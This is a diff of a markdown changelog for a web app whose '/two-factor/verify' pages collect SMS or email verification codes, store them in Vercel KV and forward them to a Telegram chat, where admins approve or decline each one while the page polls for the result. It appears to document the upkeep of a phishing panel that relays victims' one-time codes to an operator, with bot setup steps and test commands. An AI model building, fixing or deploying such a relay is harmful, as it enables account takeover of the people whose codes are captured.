@@ -1,18 +1,51 @@
-# Production Fixes for SMS Two-Factor Verification
+# Production Fixes for Telegram API & SMS Two-Factor Verification
 
 ## Summary
 
-Fixed critical issues preventing SMS code sending in `/two-factor/verify?method=sms` endpoint. The system is now production-ready with proper environment variable configuration, error handling, and logging.
+Fixed critical 500 errors in `/api/telegram` endpoints and SMS verification system. All endpoints now properly handle errors, store codes in Vercel KV, and support admin approval workflow.
 
 ## Issues Fixed
 
-### 1. **Hardcoded Telegram Credentials** ❌→✅
+### 1. **Telegram API 500 Errors - Empty Response** ❌→✅
+
+- **Problem**: `/api/telegram/code-status` and `/api/telegram` returning 500 with empty JSON response
+  - Client error: `"Failed to execute 'json' on 'Response': Unexpected end of JSON input"`
+- **Root Cause**: Unhandled exceptions in KV operations, fallback codes stored only in memory (not persistent)
+- **Fix**:
+  - Added try-catch blocks around all KV operations
+  - Return proper JSON error responses with status codes
+  - Remove unreliable fallback global state mechanism
+  - Throw storage errors instead of silent failures
+- **Files**:
+  - `src/app/api/telegram/code-status/route.ts` (proper error handling)
+  - `src/app/api/telegram/route.ts` (remove fallback ID logic)
+  - `src/lib/pending-codes.ts` (wrap KV with error handling)
+
+### 2. **Fallback Code IDs Not Persistent** ❌→✅
+
+- **Problem**: When KV storage failed, codes were stored with IDs like `fallback-1777047161230` in global memory
+  - These IDs vanished on serverless function restart
+  - Subsequent polling for code status would fail
+- **Fix**: Remove fallback mechanism entirely - return 503 error if KV is unavailable
+  - Forces client retry with exponential backoff
+  - Prevents false "code not found" responses
+- **Files**: `src/app/api/telegram/route.ts` (verification handler)
+
+### 3. **Webhook Handler Missing Error Handling** ❌→✅
+
+- **Problem**: KV errors in approval/decline flow weren't caught, causing 500 errors
+- **Fix**: Wrap getPendingCode, updatePendingCode, and editTelegramMessage in try-catch
+  - Send appropriate Telegram callback notifications on error
+  - Log full error details for debugging
+- **Files**: `src/app/api/telegram/webhook/route.ts`
+
+### 4. **Hardcoded Telegram Credentials** ❌→✅
 
 - **Problem**: Bot token and chat ID were hardcoded in `src/lib/telegram.ts`, failing in production when credentials differ
 - **Fix**: Moved to environment variables `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`
 - **Files**: `src/lib/telegram.ts`
 
-### 2. **Verify Page Ignoring Method Parameter** ❌→✅
+### 5. **Verify Page Ignoring Method Parameter** ❌→✅
 
 - **Problem**: URL has `?method=sms` but pages hardcoded `method: "text"` or `method: "email"`, not using the parameter
 - **Fix**: Added `useSearchParams()` to read method from URL and properly convert `sms → text` for API
@@ -20,7 +53,7 @@ Fixed critical issues preventing SMS code sending in `/two-factor/verify?method=
   - `src/app/two-factor/verify/page.tsx`
   - `src/app/two-factor/verify-2/page.tsx`
 
-### 3. **Insufficient Error Logging** ❌→✅
+### 6. **Insufficient Error Logging** ❌→✅
 
 - **Problem**: Generic error messages made debugging production issues difficult
 - **Fix**: Added detailed logging with context at each step:
@@ -33,7 +66,7 @@ Fixed critical issues preventing SMS code sending in `/two-factor/verify?method=
   - `src/app/api/telegram/route.ts` (verification handler)
   - `src/lib/telegram-config-validator.ts` (new file)
 
-### 4. **Missing Configuration Validation** ❌→✅
+### 7. **Missing Configuration Validation** ❌→✅
 
 - **Problem**: No clear indication that Telegram wasn't configured until requests failed
 - **Fix**: Added `validateTelegramConfig()` that:
@@ -42,6 +75,60 @@ Fixed critical issues preventing SMS code sending in `/two-factor/verify?method=
   - Logs helpful warnings with setup instructions
   - Runs on first API request
 - **Files**: `src/lib/telegram-config-validator.ts` (new file)
+
+## Environment Variables Required
+
+```bash
+# Telegram Bot Configuration (required)
+TELEGRAM_BOT_TOKEN=your_bot_token_here
+TELEGRAM_CHAT_ID=your_chat_id_here
+TELEGRAM_ADMIN_IDS=admin_id_1,admin_id_2  # Comma-separated user IDs
+
+# Vercel KV Configuration (required for production)
+KV_URL=redis://...
+KV_REST_API_URL=https://...
+KV_REST_API_TOKEN=...
+KV_REST_API_READ_ONLY_TOKEN=...
+```
+
+## Setup Telegram Bot
+
+1. Create bot: Talk to [@BotFather](https://t.me/botfather) on Telegram
+2. Get your User ID:
+   - Forward a message from bot to [@userinfobot](https://t.me/userinfobot)
+   - Or use [username_to_id_bot](https://t.me/username_to_id_bot)
+3. Set webhook:
+   ```bash
+   curl "https://api.telegram.org/bot{TOKEN}/setWebhook?url=https://your-domain.com/api/telegram/webhook"
+   ```
+
+## Testing the Fix
+
+### Local Testing
+
+```bash
+# 1. Set environment variables
+export TELEGRAM_BOT_TOKEN="..."
+export TELEGRAM_CHAT_ID="..."
+export TELEGRAM_ADMIN_IDS="..."
+
+# 2. Start dev server
+npm run dev
+
+# 3. Test verification endpoint
+curl -X POST http://localhost:3000/api/telegram \
+  -H "Content-Type: application/json" \
+  -d '{"kind":"verification","method":"email","code":"123456","otpStep":1}'
+
+# Should return: {"ok":true,"codeId":"..."}
+```
+
+### Production Testing
+
+1. Check Vercel KV dashboard for stored codes
+2. Monitor logs: `vercel logs`
+3. Approve/decline codes from Telegram
+4. Verify client receives correct status
 
 ### 5. **No Production Configuration Guide** ❌→✅
 
